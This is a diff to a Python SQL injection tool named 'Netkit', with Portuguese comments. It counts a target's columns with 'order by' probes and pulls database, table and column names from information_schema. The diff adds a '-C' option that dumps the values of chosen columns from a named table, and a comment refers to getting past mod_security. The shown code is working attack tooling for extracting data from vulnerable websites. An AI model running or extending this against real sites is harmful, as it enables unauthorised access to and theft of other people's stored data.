@@ -8,8 +8,13 @@ from time import time
 
 ini = time()
 print()
+#se for usar --columns ou um outro paramêtro que pode exigir mais de um argumento, vai poder separar de varias formas com ","
+argv = " ".join(argv)
+argv = argv.replace(" ,", ",").replace(", ", ",")
+argv = argv.split()
+
+#função que puxa as infos
 def sqli(pull_type: str, diretory: str, extra: str=""):
-    # puxar infos
     infos = ['']
     new = []
     for i in range(n):
@@ -34,6 +39,7 @@ def sqli(pull_type: str, diretory: str, extra: str=""):
         infos = "\n\033[01;91m[+]\033[0;0m\033[01;39mNot Results.\033[0;0m"
     return infos
 
+#função que conta as colunas
 def pull_columns():
     global n
     print("\033[01;32m[+]\033[0;0m\033[01;39mStarting\033[0;0m")
@@ -51,7 +57,7 @@ def pull_columns():
     print("\033[01;32m[+]\033[0;0m\033[01;39mConnection ok\033[0;0m")
     r = ""
     n = 1
-    while not "warning: mysql" in r.lower() and not "Unknown column" in r:
+    while not "warning: mysql" in r.lower() and not "unknown column" in r.lower():
         try:
             r = requests.get(f"{argv[1]} order by {n} --").text
             # tirar mod_security
@@ -65,13 +71,14 @@ def pull_columns():
     n -= 2
     print(f"\033[01;32m[+]\033[0;0m\033[01;39m{n} columns\033[0;0m")
 
+#função para pegar os parâmetros 
 def pullt(require, info):
     if not info in argv:
         print(f"Netkit: {require} requires {info}.")
         exit()
     try:
-        type = argv.index(info)+1
-        type = argv[type]
+        typ = argv.index(info)+1
+        typ = argv[typ]
     except:
         print("Netkit: missing arguments. Type -h to see the list of commands. ")
         exit()
@@ -79,7 +86,7 @@ def pullt(require, info):
     if "--dbs" in argv:
         print("Netkit: Args invalids")
         exit()
-    return type
+    return typ
 
 if "--tables" in argv:
     if "--columns" in argv:
@@ -102,6 +109,18 @@ elif "--columns" in argv:
     pull_columns()
     res = sqli("column_name", "information_schema.columns", f"and table_schema = '{db}' and table_name = '{table}'")
     print(res)
+
+elif "-C" in argv:
+    if "--tables" and "--columns" in argv:
+        print("Netkit: Args invalids")
+        exit()
+    db = pullt("-C", "-D")
+    table = pullt("-C", "-T")
+    columns = pullt("-C", "-C")
+    pull_columns()
+    for i in columns.split(","):
+        res = sqli(i, f"{db}.{table}")
+        print(res)
 
 elif "--dbs" in argv:
     pull_columns()
